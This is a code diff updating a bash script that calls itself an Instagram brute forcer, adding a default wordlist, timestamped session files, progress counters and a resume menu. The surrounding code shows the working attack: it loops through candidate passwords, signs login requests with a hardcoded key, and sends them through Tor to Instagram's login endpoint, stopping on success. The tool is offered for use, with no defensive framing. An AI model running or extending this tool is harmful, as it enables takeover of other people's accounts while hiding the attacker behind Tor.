@@ -18,7 +18,8 @@ command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not instal
 command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
 command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
 command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
-
+command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
+command -v cut > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
 if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
 echo "/dev/urandom not found!"
 exit 1
@@ -37,7 +38,7 @@ printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |    
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[45m       Instagram Brute Forcer v1.2 Author: github.com/thelinuxchoice\e[0m\n"
+printf "\e[1;77m\e[45m       Instagram Brute Forcer v1.3 Author: github.com/thelinuxchoice\e[0m\n"
 printf "\n"
 }
 
@@ -52,7 +53,9 @@ printf "\e[1;91mInvalid Username! Try again\e[0m\n"
 sleep 1
 start
 else
-read -p $'\e[1;92mPassword List: \e[0m' wl_pass
+default_wl_pass="passwords.lst"
+read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
+wl_pass="${wl_pass:-${default_wl_pass}}"
 fi
 }
 
@@ -76,9 +79,9 @@ read -p $'\e[1;77m? [Y/n]: \e[0m' session
 session="${session:-${default_session}}"
 if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
 
-printf "user=%s\n" $user > store.session
-printf "pass=%s\n" $pass >> store.session
-printf "wl_pass=%s\n" $wl_pass >> store.session
+printf "user=%s\npass=%s\nwl_pass=%s\n" $user $pass $wl_pass > store.session.$user.$(date +"%FT%H%M")
+#printf "pass=%s\n" $pass >> store.session
+#printf "wl_pass=%s\n" $wl_pass >> store.session
 printf "\e[1;77mSession saved.\e[0m\n"
 printf "\e[1;92mUse ./instashell --resume\n"
 else
@@ -119,6 +122,10 @@ var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 function bruteforcer() {
 
 checktor
+count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
+printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
+printf "\e[1;91m[*] Press Ctrl + C to save session\n\e[0m"
 IFS=$'\n'
 for pass in $(cat $wl_pass); do
 
@@ -127,9 +134,9 @@ header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www
 data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
-
+countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)
 
 if [[ "$check" == "200" ]]; then
@@ -166,8 +173,19 @@ function resume() {
 
 banner 
 checktor
-source store.session
-printf "\e[1;92m[*] Resuming session for user\e[0m \e[1;77m%s\e[0m\n" $user
+counter=1
+printf "\e[1;92mFiles sessions:\n\e[0m"
+for list in $(ls store.session*); do
+source $list
+printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" $counter $list $wl_pass $pass
+let counter++
+done
+read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
+source $(ls store.session* | sed ''$fileresume'q;d')
+printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
+printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
+printf "\e[1;91m[*] Press Ctrl + C to save session\n\e[0m"
+count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 IFS=$'\n'
 for pass in $(sed -n '/'$pass'/,$p' $wl_pass); do
 
@@ -176,9 +194,10 @@ header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www
 data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
-
+countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
+#printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
 check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)
 
 if [[ "$check" == "200" ]]; then
